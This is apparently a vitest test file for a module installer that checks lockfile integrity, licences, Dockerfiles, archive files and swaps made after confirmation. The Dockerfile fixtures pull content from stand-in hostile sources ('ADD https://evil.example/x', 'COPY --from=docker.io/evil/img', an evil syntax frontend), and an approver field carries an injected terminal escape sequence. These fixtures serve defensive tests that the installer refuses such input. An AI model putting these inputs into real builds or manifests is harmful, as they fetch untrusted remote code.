// Installing a module (docs/plans/extension-modules.md R1, R2, R4, R26, R28; A4, A23, A26, A34): every refusal names
// what it refuses and writes nothing under ASHA_HOME/modules/; the archive's checks in R28's order; the staged copy;
// the promotion, the upgrade's swap, and the repair of what a killed install left.

import { execFileSync } from 'node:child_process';
import { constants } from 'node:fs';
import { chmod, mkdir, mkdtemp, open, readdir, readFile, rename, symlink, truncate, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { beforeEach, describe, expect, it } from 'vitest';

import {
  InstallRefused,
  dockerfileProblem,
  insideGitTree,
  installModule,
  readHandle,
  repairLeftovers,
  type InstallProps,
} from '../../src/daemon/modules/install.js';
import { present } from '../../src/shared/assert-present.js';
import { byCodeUnit } from '../../src/shared/order.js';
import { PERMISSIVE_LICENCES } from '../../src/shared/modules.js';
import { RecordingLogger } from '../helpers/fakes.js';
import { PLUGIN_DOCKERFILE, pluginManifest, sha256, toolModuleManifest, writeModuleDir } from '../helpers/modules.js';

const LOCK = '{"lockfileVersion":3,"packages":{"":{}}}\n';
const ENTRY = 'export async function call() { return { ok: true, result: 1 }; }\n';

interface Run {
  readonly home: string;
  readonly modulesDir: string;
  readonly logger: RecordingLogger;
  readonly out: { progress: string[]; warn: string[]; summaries: string[] };
  readonly vm: { arch: string; calls: string[] };
  readonly reads: { bytes: number };
}

async function home(): Promise<Run> {
  const h = await mkdtemp(join(tmpdir(), 'asha-install-home-'));
  return {
    home: h,
    modulesDir: join(h, 'modules'),
    logger: new RecordingLogger(),
    out: { progress: [], warn: [], summaries: [] },
    vm: { arch: 'aarch64', calls: [] },
    reads: { bytes: 0 },
  };
}

function props(run: Run, source: string, extra: Partial<InstallProps> = {}): InstallProps {
  return {
    source,
    archive: undefined,
    home: run.home,
    modulesDir: run.modulesDir,
    logger: run.logger,
    vm: {
      ensureRunning: () => {
        run.vm.calls.push('ensureRunning');
        return Promise.resolve('ready');
      },
      vmArchitecture: () => {
        run.vm.calls.push('uname -m');
        return Promise.resolve(run.vm.arch);
      },
    },
    insideGitTree: () => Promise.resolve(false),
    beforeStaging: () => Promise.resolve(),
    readArchive: async (handle, buffer, length, position) => {
      const n = await readHandle(handle, buffer, length, position);
      run.reads.bytes += n;
      return n;
    },
    io: {
      progress: (l) => run.out.progress.push(l),
      warn: (l) => run.out.warn.push(l),
      confirm: (summary) => {
        run.out.summaries.push(summary);
        return Promise.resolve(true);
      },
    },
    ...extra,
  };
}

async function refusal(promise: Promise<unknown>): Promise<InstallRefused> {
  try {
    await promise;
  } catch (error) {
    if (error instanceof InstallRefused) return error;
    throw error;
  }
  throw new Error('the install was not refused');
}

/** What ASHA_HOME/modules/ holds, recursively: nothing must change on a refusal. */
async function modulesTree(run: Run): Promise<string[]> {
  try {
    return (await readdir(run.modulesDir, { recursive: true })).sort(byCodeUnit);
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code === 'ENOENT') return [];
    throw error;
  }
}

async function jsModule(
  manifest: Record<string, unknown> = toolModuleManifest(),
  files: Record<string, string> = { 'index.mjs': ENTRY, 'package-lock.json': LOCK },
): Promise<string> {
  return writeModuleDir(manifest, files);
}

describe('a JavaScript module (R1, R2, R4, A4)', () => {
  let run: Run;
  beforeEach(async () => {
    run = await home();
  });

  it('installs a valid module by one rename of a staging directory, printing the summary first', async () => {
    const source = await jsModule();
    const installed = await installModule(props(run, source));
    expect(installed).toMatchObject({ dir: join(run.modulesDir, 'fixture_tool'), upgraded: false });
    expect(await modulesTree(run)).toEqual([
      'fixture_tool',
      'fixture_tool/index.mjs',
      'fixture_tool/module.json',
      'fixture_tool/package-lock.json',
    ]);
    expect(await readFile(join(run.modulesDir, 'fixture_tool', 'index.mjs'), 'utf8')).toBe(ENTRY);
    expect(run.out.summaries).toHaveLength(1);
    expect(run.out.summaries[0]).toContain('module fixture_tool 1.0.0 (ToolModule)');
    expect(run.out.summaries[0]).toContain(
      'tool fixture_tool/lookup [no class], at most 5000 ms:\n    Look a word up.\n    - word: The word',
    );
    expect(run.logger.events()).toEqual(['module.installed']);
    // A JavaScript module needs no VM to be checked (its image is built after, by the command).
    expect(run.vm.calls).toEqual([]);
  });

  const cases: [string, () => Promise<string>, RegExp][] = [
    [
      'a lockfile entry without integrity',
      () =>
        jsModule(
          toolModuleManifest({
            dependencies: {
              'node_modules/left-pad': { id: 'MIT', url: 'https://x.test/l', read: '2026-10-01', version: '1.0.0' },
            },
          }),
          {
            'index.mjs': ENTRY,
            'package-lock.json': JSON.stringify({
              lockfileVersion: 3,
              packages: { '': {}, 'node_modules/left-pad': { version: '1.0.0' } },
            }),
          },
        ),
      /the package node_modules\/left-pad has no integrity hash/,
    ],
    [
      'a lockfile entry with hasInstallScript',
      () =>
        jsModule(
          toolModuleManifest({
            dependencies: {
              'node_modules/left-pad': { id: 'MIT', url: 'https://x.test/l', read: '2026-10-01', version: '1.0.0' },
            },
          }),
          {
            'index.mjs': ENTRY,
            'package-lock.json': JSON.stringify({
              lockfileVersion: 3,
              packages: {
                '': {},
                'node_modules/left-pad': { version: '1.0.0', integrity: 'sha512-x', hasInstallScript: true },
              },
            }),
          },
        ),
      /the package node_modules\/left-pad has an install script/,
    ],
    [
      'a dependency with no licence entry',
      () =>
        jsModule(toolModuleManifest(), {
          'index.mjs': ENTRY,
          'package-lock.json': JSON.stringify({
            lockfileVersion: 3,
            packages: { '': {}, 'node_modules/left-pad': { version: '1.0.0', integrity: 'sha512-x' } },
          }),
        }),
      /the package node_modules\/left-pad has no licence entry in module.json's dependencies/,
    ],
    [
      "a node_modules/x/package.json whose license differs from the manifest's",
      () =>
        jsModule(
          toolModuleManifest({
            dependencies: {
              'node_modules/x': { id: 'MIT', url: 'https://x.test/l', read: '2026-10-01', version: '1.0.0' },
            },
          }),
          {
            'index.mjs': ENTRY,
            'package-lock.json': JSON.stringify({
              lockfileVersion: 3,
              packages: { '': {}, 'node_modules/x': { version: '1.0.0', integrity: 'sha512-x' } },
            }),
            'node_modules/x/package.json': JSON.stringify({ name: 'x', license: 'GPL-3.0-only' }),
          },
        ),
      /node_modules\/x\/package.json says its licence is "GPL-3.0-only", and module.json says MIT/,
    ],
    [
      'a module licence off the allowlist (GPL-3.0-only)',
      () =>
        jsModule(toolModuleManifest({ licence: { id: 'GPL-3.0-only', url: 'https://x.test/l', read: '2026-10-01' } })),
      /the module fixture_tool: GPL-3.0-only/,
    ],
    [
      'a dependency licence off the allowlist (LGPL-2.1-only)',
      () =>
        jsModule(
          toolModuleManifest({
            dependencies: {
              'node_modules/x': { id: 'LGPL-2.1-only', url: 'https://x.test/l', read: '2026-10-01', version: '1.0.0' },
            },
          }),
          {
            'index.mjs': ENTRY,
            'package-lock.json': JSON.stringify({
              lockfileVersion: 3,
              packages: { '': {}, 'node_modules/x': { version: '1.0.0', integrity: 'sha512-x' } },
            }),
          },
        ),
      /node_modules\/x: LGPL-2.1-only/,
    ],
  ];
  for (const [name, make, message] of cases) {
    it(`refuses ${name}, naming it, and writes nothing`, async () => {
      const error = await refusal(installModule(props(run, await make())));
      expect(error.message).toMatch(message);
      expect(await modulesTree(run)).toEqual([]);
      expect(run.out.summaries).toEqual([]);
    });
  }

  // A23: the same module from a directory inside a git working tree (as a module in this repository's modules/ is)
  // and from a temporary directory outside any: identical checks and outcomes, each refusal reproduced for both.
  const inGitTree = async (): Promise<string> => {
    const repo = await mkdtemp(join(tmpdir(), 'asha-install-repo-'));
    execFileSync('git', ['init', '-q', repo]);
    await mkdir(join(repo, 'modules'));
    return join(repo, 'modules');
  };
  const where = {
    outside: async () => mkdtemp(join(tmpdir(), 'asha-install-src-')),
    'inside a git working tree': inGitTree,
  };
  it('installs the same module alike from inside a git working tree and from outside: one summary, one tree (A23)', async () => {
    const outcomes: unknown[] = [];
    for (const [name, parent] of Object.entries(where)) {
      const r = await home();
      const source = await writeModuleDir(
        toolModuleManifest(),
        { 'index.mjs': ENTRY, 'package-lock.json': LOCK },
        await parent(),
      );
      expect([name, await insideGitTree(source)]).toEqual([name, name !== 'outside']);
      await installModule({ ...props(r, source), insideGitTree });
      outcomes.push({ summaries: r.out.summaries, tree: await modulesTree(r), events: r.logger.events() });
    }
    expect(outcomes[1]).toEqual(outcomes[0]);
  });
  for (const [name, make, message] of cases) {
    it(`refuses ${name} alike from inside a git working tree and from outside (A23)`, async () => {
      const messages: string[] = [];
      for (const parent of Object.values(where)) {
        const r = await home();
        const made = await make();
        // The case's module, moved under the source's parent.
        const source = join(await parent(), 'fixture_tool');
        await rename(made, source);
        const error = await refusal(installModule({ ...props(r, source), insideGitTree }));
        expect(error.message).toMatch(message);
        messages.push(error.message.replaceAll(source, '<source>'));
        expect(await modulesTree(r)).toEqual([]);
      }
      expect(messages[1]).toBe(messages[0]);
    });
  }
  it('refuses a changed file, an unlisted file and a symbolic link alike from inside a git working tree and from outside (A23)', async () => {
    const outcomes: string[][] = [];
    for (const parent of Object.values(where)) {
      const r = await home();
      const got: string[] = [];
      const changed = await writeModuleDir(
        toolModuleManifest(),
        { 'index.mjs': ENTRY, 'package-lock.json': LOCK },
        await parent(),
      );
      await writeFile(join(changed, 'index.mjs'), `${ENTRY}// changed\n`);
      got.push(
        (await refusal(installModule({ ...props(r, changed), insideGitTree }))).message.replaceAll(changed, '<source>'),
      );
      const extra = await writeModuleDir(
        toolModuleManifest(),
        { 'index.mjs': ENTRY, 'package-lock.json': LOCK },
        await parent(),
      );
      await writeFile(join(extra, 'extra.mjs'), 'x');
      got.push(
        (await refusal(installModule({ ...props(r, extra), insideGitTree }))).message.replaceAll(extra, '<source>'),
      );
      const linked = await writeModuleDir(
        toolModuleManifest(),
        { 'index.mjs': ENTRY, 'package-lock.json': LOCK },
        await parent(),
      );
      await symlink('/etc/hosts', join(linked, 'hosts'));
      got.push(
        (await refusal(installModule({ ...props(r, linked), insideGitTree }))).message.replaceAll(linked, '<source>'),
      );
      expect(await modulesTree(r)).toEqual([]);
      outcomes.push(got);
    }
    expect(outcomes[0]).toHaveLength(3);
    expect(outcomes[1]).toEqual(outcomes[0]);
  });

  it('refuses a file whose sha256 differs, and a file not in the manifest, naming the file', async () => {
    const source = await jsModule();
    await writeFile(join(source, 'index.mjs'), `${ENTRY}// changed\n`);
    expect((await refusal(installModule(props(run, source)))).message).toMatch(
      /index.mjs has sha256 [0-9a-f]{64}, and its manifest says/,
    );
    const other = await jsModule();
    await writeFile(join(other, 'extra.mjs'), 'x');
    expect((await refusal(installModule(props(run, other)))).message).toContain(
      'extra.mjs is in its directory and not in its manifest',
    );
    expect(await modulesTree(run)).toEqual([]);
  });

  it('refuses a symbolic link in the module directory', async () => {
    const source = await jsModule();
    await symlink('/etc/hosts', join(source, 'hosts'));
    expect((await refusal(installModule(props(run, source)))).message).toContain(
      'hosts in the module directory is a symbolic link',
    );
  });

  for (const id of PERMISSIVE_LICENCES) {
    it(`accepts the licence ${id}`, async () => {
      await expect(
        installModule(
          props(
            run,
            await jsModule(toolModuleManifest({ licence: { id, url: 'https://x.test/l', read: '2026-10-01' } })),
          ),
        ),
      ).resolves.toMatchObject({ upgraded: false });
    });
  }

  it('installs nothing when the user does not confirm', async () => {
    const source = await jsModule();
    const error = await refusal(
      installModule(
        props(run, source, {
          io: { progress: () => undefined, warn: () => undefined, confirm: () => Promise.resolve(false) },
        }),
      ),
    );
    expect(error.message).toBe('✗ module fixture_tool was not installed: not confirmed');
    expect(await modulesTree(run)).toEqual([]);
  });

  // The order of the renames is proven by the repair cases below (each state a killed upgrade can leave); this case
  // proves the outcome (review of 2026-10-02, B-32: the title claimed the order).
  it('upgrades: the new version is installed whole, and nothing of the old one is left', async () => {
    await installModule(props(run, await jsModule()));
    const v2 = await jsModule(toolModuleManifest({ version: '2.0.0' }), {
      'index.mjs': `${ENTRY}// v2\n`,
      'package-lock.json': LOCK,
    });
    const installed = await installModule(props(run, v2));
    expect(installed.upgraded).toBe(true);
    expect(await modulesTree(run)).toEqual([
      'fixture_tool',
      'fixture_tool/index.mjs',
      'fixture_tool/module.json',
      'fixture_tool/package-lock.json',
    ]);
    expect(await readFile(join(run.modulesDir, 'fixture_tool', 'index.mjs'), 'utf8')).toBe(`${ENTRY}// v2\n`);
    expect(run.logger.entries.at(-1)).toMatchObject({
      event: 'module.installed',
      fields: { module: 'fixture_tool', version: '2.0.0', upgraded: true },
    });
  });

  it('refuses archive= for a module that is not a command plugin, as a usage error', async () => {
    const error = await refusal(installModule(props(run, await jsModule(), { archive: '/tmp/x' })));
    expect([error.usage, error.message]).toEqual([
      true,
      'archive= is for a command plugin; module fixture_tool is a ToolModule',
    ]);
  });
});

describe('repairing what a killed install left (R28, E2; A34)', () => {
  it('removes a .staging-*, restores a .replaced-<id>-* with no <id>/, deletes one beside <id>/, each logged, before anything else', async () => {
    const run = await home();
    await mkdir(join(run.modulesDir, '.staging-x'), { recursive: true });
    await mkdir(join(run.modulesDir, '.replaced-alpha-aa'), { recursive: true });
    await writeFile(join(run.modulesDir, '.replaced-alpha-aa', 'module.json'), '{}');
    await mkdir(join(run.modulesDir, 'beta'), { recursive: true });
    await mkdir(join(run.modulesDir, '.replaced-beta-bb'), { recursive: true });
    await repairLeftovers(run.modulesDir, run.logger, { warn: (l) => run.out.warn.push(l) });
    expect(await modulesTree(run)).toEqual(['alpha', 'alpha/module.json', 'beta']);
    expect(run.logger.entries.map((e) => [e.event, e.fields['leftover']])).toEqual(
      expect.arrayContaining([
        ['module.leftover_removed', '.staging-x'],
        ['module.upgrade_restored', '.replaced-alpha-aa'],
        ['module.leftover_removed', '.replaced-beta-bb'],
      ]),
    );
    expect(run.out.warn).toHaveLength(3);
  });
});

/** A command plugin fixture whose manifest pins `archive`'s sha256 for both architectures. */
async function plugin(
  archive: Buffer,
  extra: Record<string, unknown> = {},
  dockerfile = PLUGIN_DOCKERFILE,
): Promise<{ source: string; archivePath: string }> {
  const sha = sha256(archive);
  const base = pluginManifest();
  const ex = base['executable'] as Record<string, unknown>;
  const manifest = pluginManifest({
    executable: {
      ...ex,
      archives: {
        aarch64: { url: 'https://example.test/cli-aarch64.tar', sha256: sha, file: 'cli-aarch64.tar' },
        x86_64: { url: 'https://example.test/cli-x86_64.tar', sha256: sha, file: 'cli-x86_64.tar' },
      },
    },
    ...extra,
  });
  const source = await writeModuleDir(manifest, { Dockerfile: dockerfile });
  const archivePath = join(await mkdtemp(join(tmpdir(), 'asha-archive-')), 'downloaded.tar');
  await writeFile(archivePath, archive);
  return { source, archivePath };
}

describe('a command plugin and its archive (R26, R28; A23, A26, A34)', () => {
  const ARCHIVE = Buffer.from('fixture release archive\n'.repeat(100));
  let run: Run;
  beforeEach(async () => {
    run = await home();
  });

  it("installs the matching archive for the VM, under that entry's name, with its install record, by one rename", async () => {
    const { source, archivePath } = await plugin(ARCHIVE);
    for (const arch of ['aarch64', 'x86_64']) {
      const r = await home();
      await mkdir(join(r.modulesDir, '.staging-x'), { recursive: true });
      r.vm.arch = arch;
      await installModule(props(r, source, { archive: archivePath }));
      expect(await modulesTree(r)).toEqual([
        'fixture_cli',
        'fixture_cli/.asha-install.json',
        'fixture_cli/Dockerfile',
        `fixture_cli/cli-${arch}.tar`,
        'fixture_cli/module.json',
      ]);
      expect(JSON.parse(await readFile(join(r.modulesDir, 'fixture_cli', '.asha-install.json'), 'utf8'))).toEqual({
        architecture: arch,
        archive: { file: `cli-${arch}.tar`, sha256: sha256(ARCHIVE) },
      });
      expect(await readFile(join(r.modulesDir, 'fixture_cli', `cli-${arch}.tar`))).toEqual(ARCHIVE);
      expect(r.logger.events()).toEqual(['module.leftover_removed', 'module.installed']);
      expect(r.vm.calls).toEqual(['ensureRunning', 'uname -m']);
    }
  });

  it('accepts an Apache-2.0 plugin whose archive holds an LGPL file, never reading the archive for a licence (O2)', async () => {
    const { source, archivePath } = await plugin(Buffer.from('SPDX-License-Identifier: LGPL-2.1-or-later\n'));
    await expect(installModule(props(run, source, { archive: archivePath }))).resolves.toMatchObject({
      upgraded: false,
    });
  });

  it('refuses a plugin whose own licence is GPL-3.0-only, naming it', async () => {
    const { source, archivePath } = await plugin(ARCHIVE, {
      executable: {
        ...(pluginManifest()['executable'] as object),
        licence: { id: 'GPL-3.0-only', url: 'https://x.test/l', read: '2026-10-01' },
        archives: { aarch64: { url: 'https://example.test/a', sha256: sha256(ARCHIVE), file: 'a.tar' } },
      },
    });
    expect((await refusal(installModule(props(run, source, { archive: archivePath })))).message).toContain(
      'the executable fixture-cli: GPL-3.0-only',
    );
  });

  for (const [name, dockerfile, message] of [
    ['a FROM without a digest', 'FROM debian\nUSER 1000:1000\n', 'its FROM debian names another image'],
    [
      'a FROM naming another digest-pinned image',
      'FROM node:22-alpine@sha256:c610fcdfb1d5b4740dd70c284ed3cb16bb857e0f7166196e36a5501df7a3aa32\nUSER 1000:1000\n',
      'its FROM node:22-alpine@sha256:c610fcdfb1d5b4740dd70c284ed3cb16bb857e0f7166196e36a5501df7a3aa32 names another image',
    ],
    [
      'a last instruction that is not USER 1000:1000',
      'ARG ASHA_PLUGIN_BASE\nFROM ${ASHA_PLUGIN_BASE}\nUSER root\n',
      'its last instruction must be USER 1000:1000',
    ],
    // Review of 2026-10-02, H2: each of these reads another image, or the network, at build.
    [
      'a syntax parser directive',
      '# syntax=docker.io/evil/frontend\nARG ASHA_PLUGIN_BASE\nFROM ${ASHA_PLUGIN_BASE}\nUSER 1000:1000\n',
      'parser directive "# syntax=docker.io/evil/frontend"',
    ],
    [
      'COPY --from another image',
      'ARG ASHA_PLUGIN_BASE\nFROM ${ASHA_PLUGIN_BASE}\nCOPY --from=docker.io/evil/img / /\nUSER 1000:1000\n',
      'copies from another image or stage (--from)',
    ],
    [
      'RUN --mount from another image',
      'ARG ASHA_PLUGIN_BASE\nFROM ${ASHA_PLUGIN_BASE}\nRUN --mount=type=bind,from=evil/img,target=/x true\nUSER 1000:1000\n',
      'mounts from elsewhere (RUN --mount)',
    ],
    [
      'an ADD',
      'ARG ASHA_PLUGIN_BASE\nFROM ${ASHA_PLUGIN_BASE}\nADD https://evil.example/x /x\nUSER 1000:1000\n',
      'is not one a command plugin may use',
    ],
  ] as const) {
    it(`refuses a Dockerfile with ${name}, naming it`, async () => {
      expect(dockerfileProblem(dockerfile)).toContain(message);
      const { source, archivePath } = await plugin(ARCHIVE, {}, dockerfile);
      expect((await refusal(installModule(props(run, source, { archive: archivePath })))).message).toContain(message);
      expect(await modulesTree(run)).toEqual([]);
    });
  }

  it('refuses a release file placed in the module directory (not in the manifest)', async () => {
    const { source, archivePath } = await plugin(ARCHIVE);
    await writeFile(join(source, 'cli-aarch64.tar'), ARCHIVE);
    expect((await refusal(installModule(props(run, source, { archive: archivePath })))).message).toContain(
      'cli-aarch64.tar is in its directory and not in its manifest',
    );
  });

  const preChecks: [
    string,
    (s: { source: string; archivePath: string }, r: Run) => Promise<Partial<InstallProps>>,
    RegExp,
  ][] = [
    [
      'no archive=',
      () => Promise.resolve({ archive: undefined }),
      /needs its release archive: download https:\/\/example.test\/cli-aarch64.tar \(sha256 [0-9a-f]{64}\)/,
    ],
    // True only for ASHA_HOME itself, so the refusal proves the check was asked about ASHA_HOME (review B-32).
    [
      'ASHA_HOME inside a git tree',
      (_s, r) => Promise.resolve({ insideGitTree: (path: string) => Promise.resolve(path === r.home) }),
      /is inside a git working tree/,
    ],
    ['a missing file', ({ archivePath }) => Promise.resolve({ archive: `${archivePath}.missing` }), /: no such file/],
    [
      'a symbolic link to the matching archive',
      async ({ archivePath }) => {
        const link = `${archivePath}.link`;
        await symlink(archivePath, link);
        return { archive: link };
      },
      /it is a symbolic link, not a regular file/,
    ],
    [
      'a FIFO',
      ({ archivePath }) => {
        const fifo = `${archivePath}.fifo`;
        execFileSync('mkfifo', [fifo]);
        return Promise.resolve({ archive: fifo });
      },
      /it is a FIFO, not a regular file/,
    ],
    [
      'a directory',
      async ({ archivePath }) => {
        const dir = `${archivePath}.dir`;
        await mkdir(dir);
        return { archive: dir };
      },
      /it is a directory, not a regular file/,
    ],
    [
      'a sparse file of 1 GiB + 1 byte',
      async ({ archivePath }) => {
        const big = `${archivePath}.big`;
        await writeFile(big, '');
        await truncate(big, 1024 * 1024 * 1024 + 1);
        return { archive: big };
      },
      /it is 1073741825 bytes, over the cap of 1073741824 bytes \(1 GiB\)/,
    ],
  ];
  for (const [name, setup, message] of preChecks) {
    it(`refuses ${name} before the summary, reading none of it`, async () => {
      const s = await plugin(ARCHIVE);
      const extra = await setup(s, run);
      const error = await refusal(installModule(props(run, s.source, { archive: s.archivePath, ...extra })));
      expect(error.message).toMatch(message);
      expect(run.out.summaries).toEqual([]);
      expect(run.reads.bytes).toBe(0);
      expect(await modulesTree(run)).toEqual([]);
    }, 20_000);
  }

  it('refuses a VM architecture the manifest lists no archive for, naming both', async () => {
    const s = await plugin(ARCHIVE);
    run.vm.arch = 'riscv64';
    expect((await refusal(installModule(props(run, s.source, { archive: s.archivePath })))).message).toBe(
      "✗ command plugin fixture_cli lists no archive for this colima VM's architecture, riscv64; it lists aarch64, x86_64",
    );
  });

  it('refuses a file whose sha256 differs, naming both values', async () => {
    const s = await plugin(ARCHIVE);
    await writeFile(s.archivePath, Buffer.from('another file'));
    const error = await refusal(installModule(props(run, s.source, { archive: s.archivePath })));
    expect(error.message).toBe(
      `✗ archive=${s.archivePath}: its sha256 is ${sha256('another file')}, and the manifest expects ${sha256(ARCHIVE)}`,
    );
    expect(await modulesTree(run)).toEqual([]);
  });

  it('installs the bytes of the descriptor checked when another file is renamed over the path after the checks', async () => {
    const s = await plugin(ARCHIVE);
    const swap = `${s.archivePath}.swap`;
    await writeFile(swap, Buffer.from('swapped'));
    await installModule(
      props(run, s.source, { archive: s.archivePath, beforeStaging: () => rename(swap, s.archivePath) }),
    );
    expect(sha256(await readFile(join(run.modulesDir, 'fixture_cli', 'cli-aarch64.tar')))).toBe(sha256(ARCHIVE));
  });

  it('refuses the file overwritten in place after the checks, naming both sha256 values', async () => {
    const s = await plugin(ARCHIVE);
    const overwrite = async () => {
      const h = await open(s.archivePath, constants.O_WRONLY);
      await h.write(Buffer.from('X'), 0, 1, 0);
      await h.close();
    };
    const error = await refusal(
      installModule(props(run, s.source, { archive: s.archivePath, beforeStaging: overwrite })),
    );
    expect(error.message).toMatch(
      new RegExp(`its sha256 is [0-9a-f]{64}, and the manifest expects ${sha256(ARCHIVE)}`),
    );
    expect(await modulesTree(run)).toEqual([]);
  });

  it('refuses the file grown by one byte after the checks, reading no more than fstat reported', async () => {
    const s = await plugin(ARCHIVE);
    const grow = async () => {
      const h = await open(s.archivePath, constants.O_WRONLY | constants.O_APPEND);
      await h.write(Buffer.from('!'));
      await h.close();
    };
    const error = await refusal(installModule(props(run, s.source, { archive: s.archivePath, beforeStaging: grow })));
    expect(error.message).toBe(
      `✗ archive=${s.archivePath}: it grew while it was copied, past the ${String(ARCHIVE.length)} bytes it held when checked`,
    );
    expect(run.reads.bytes).toBe(ARCHIVE.length);
    expect(await modulesTree(run)).toEqual([]);
  });

  it('refuses a manifest whose per-file list names .asha-install.json, naming the field', async () => {
    const s = await plugin(ARCHIVE);
    const manifest = JSON.parse(await readFile(join(s.source, 'module.json'), 'utf8')) as Record<
      string,
      Record<string, string>
    >;
    present(manifest['files'], "manifest['files']")['.asha-install.json'] = 'c'.repeat(64);
    await writeFile(join(s.source, 'module.json'), JSON.stringify(manifest));
    expect((await refusal(installModule(props(run, s.source, { archive: s.archivePath })))).message).toContain(
      'files[".asha-install.json"]',
    );
  });

  it('upgrades a plugin with its new archive', async () => {
    const v1 = await plugin(ARCHIVE);
    await installModule(props(run, v1.source, { archive: v1.archivePath }));
    const v2Archive = Buffer.from('v2 archive');
    const v2 = await plugin(v2Archive, { version: '2.0.0' });
    await installModule(props(run, v2.source, { archive: v2.archivePath }));
    expect(await readFile(join(run.modulesDir, 'fixture_cli', 'cli-aarch64.tar'))).toEqual(v2Archive);
    expect((await modulesTree(run)).filter((p) => p.startsWith('.'))).toEqual([]);
  });

  it('never opens a FIFO in a way that blocks', async () => {
    const s = await plugin(ARCHIVE);
    const fifo = `${s.archivePath}.fifo2`;
    execFileSync('mkfifo', [fifo]);
    await chmod(fifo, 0o600);
    const started = Date.now();
    await refusal(installModule(props(run, s.source, { archive: fifo })));
    expect(Date.now() - started).toBeLessThan(5_000);
  });
});

describe('what is installed is what was checked and confirmed (review of 2026-10-02, B-7, B-16, B-17)', () => {
  let run: Run;
  beforeEach(async () => {
    run = await home();
  });

  it('installs the manifest the user confirmed, though the source manifest is swapped after the confirmation', async () => {
    const source = await jsModule();
    const confirmed = await readFile(join(source, 'module.json'), 'utf8');
    const swapped = JSON.stringify({ ...JSON.parse(confirmed), hosts: ['evil.example.com'] });
    await installModule(props(run, source, { beforeStaging: () => writeFile(join(source, 'module.json'), swapped) }));
    expect(await readFile(join(run.modulesDir, 'fixture_tool', 'module.json'), 'utf8')).toBe(confirmed);
  });

  it('refuses a Dockerfile swapped after the confirmation: the copy is hashed against the sha256 the check read', async () => {
    const archive = Buffer.from('fixture release archive\n'.repeat(100));
    const s = await plugin(archive);
    const error = await refusal(
      installModule(
        props(run, s.source, {
          archive: s.archivePath,
          beforeStaging: () => writeFile(join(s.source, 'Dockerfile'), 'FROM evil\nUSER 1000:1000\n'),
        }),
      ),
    );
    expect(error.message).toContain('Dockerfile changed while it was copied');
    expect(await modulesTree(run)).toEqual([]);
  });

  it('refuses a node_modules package.json that is not JSON, naming the module and the file (B-27)', async () => {
    const source = await jsModule(
      toolModuleManifest({
        dependencies: {
          'node_modules/x': { id: 'MIT', url: 'https://x.test/l', read: '2026-10-01', version: '1.0.0' },
        },
      }),
      {
        'index.mjs': ENTRY,
        'package-lock.json': JSON.stringify({
          lockfileVersion: 3,
          packages: { '': {}, 'node_modules/x': { version: '1.0.0', integrity: 'sha512-x' } },
        }),
        'node_modules/x/package.json': '{ not json',
      },
    );
    expect((await refusal(installModule(props(run, source)))).message).toMatch(
      /^✗ module fixture_tool: node_modules\/x\/package\.json does not read as JSON \(/,
    );
  });

  it('refuses an unlisted file named constructor, toString or __proto__ (an inherited key is not a listing)', async () => {
    for (const name of ['constructor', 'toString', '__proto__']) {
      const source = await jsModule();
      await writeFile(join(source, name), 'x');
      expect((await refusal(installModule(props(run, source)))).message).toContain(
        `${name} is in its directory and not in its manifest's files`,
      );
    }
    expect(await modulesTree(run)).toEqual([]);
  });

  it('shows control characters in the version and the approver escaped, so they cannot rewrite the summary', async () => {
    const source = await jsModule(toolModuleManifest({ cost: { model: 'free' } }));
    await installModule(props(run, source));
    const s = await plugin(Buffer.from('fixture release archive\n'.repeat(100)), {
      cost: { model: 'external-unmetered', approved: { by: 'owner\u001b[2K', date: '2026-10-01', capUsd: 5 } },
    });
    await installModule(props(run, s.source, { archive: s.archivePath }));
    const summary = present(run.out.summaries.at(-1), 'run.out.summaries.at(-1)');
    expect(summary).not.toContain('\u001b');
    expect(summary).toContain('approved by owner\\u001b[2K');
  });
});
